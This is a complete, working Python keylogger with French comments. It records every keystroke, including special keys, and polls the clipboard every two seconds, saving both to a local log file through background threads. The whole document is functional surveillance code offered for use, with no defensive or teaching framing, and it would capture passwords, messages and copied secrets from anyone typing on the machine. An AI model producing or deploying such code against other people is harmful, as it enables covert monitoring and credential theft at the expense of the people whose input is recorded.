import os
import time
import pyperclip
from pynput import keyboard
from threading import Thread
import datetime

# === CONFIGURATION ===
DOSSIER_LOG = os.path.dirname(__file__)
FICHIER_LOG = os.path.join(DOSSIER_LOG, "log_complet.txt")
INTERVALLE_SAUVEGARDE = 30  # secondes
SAUVEGARDER_A_CHAQUE_ENTER = True

# Variables globales
log_actuel = ""
dernier_presse_papiers = ""

def ecrire_dans_fichier():
    global log_actuel
    if log_actuel.strip():
        with open(FICHIER_LOG, "a", encoding="utf-8") as f:
            f.write(log_actuel)
        log_actuel = ""  # on vide le buffer après écriture

def sauvegarde_periodique():
    while True:
        time.sleep(INTERVALLE_SAUVEGARDE)
        if log_actuel.strip():
            ecrire_dans_fichier()
            print(f"[+] Sauvegarde auto à {time.strftime('%H:%M:%S')}")

def surveiller_presse_papiers():
    global dernier_presse_papiers
    while True:
        try:
            actuel = pyperclip.paste()
            if actuel != dernier_presse_papiers and actuel.strip():
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                ajout = f"\n\n[CLIPBOARD {timestamp}]\n{actuel}\n{'-'*50}\n"
                global log_actuel
                log_actuel += ajout
                with open(FICHIER_LOG, "a", encoding="utf-8") as f:
                    f.write(ajout)
                dernier_presse_papiers = actuel
        except:
            pass
        time.sleep(2)

def on_press(key):
    global log_actuel
    try:
        # Touches normales
        log_actuel += key.char
    except AttributeError:
        # Touches spéciales
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.delete: "[SUPPR]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.cmd: "[WIN]",
            keyboard.Key.caps_lock: "[CAPSLOCK]",
        }
        touche = special.get(key, f"[{str(key).upper()}]")
        log_actuel += touche

        # Sauvegarde immédiate sur Entrée si activé
        if SAUVEGARDER_A_CHAQUE_ENTER and key == keyboard.Key.enter:
            log_actuel += "\n"
            ecrire_dans_fichier()

# === Lancement des threads ===
print("Keylogger démarré en arrière-plan...")
print(f"Logs sauvegardés dans : {FICHIER_LOG}")
print("Appuie sur Ctrl+C pour arrêter")

# Thread sauvegarde périodique
thread_save = Thread(target=sauvegarde_periodique, daemon=True)
thread_save.start()

# Thread surveillance presse-papiers
thread_clip = Thread(target=surveiller_presse_papiers, daemon=True)
thread_clip.start()

# Démarrage du listener clavier (bloquant)
with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\nArrêt du keylogger...")
        ecrire_dans_fichier()  # sauvegarde finale
        print("Logs finaux sauvegardés. Bye !")
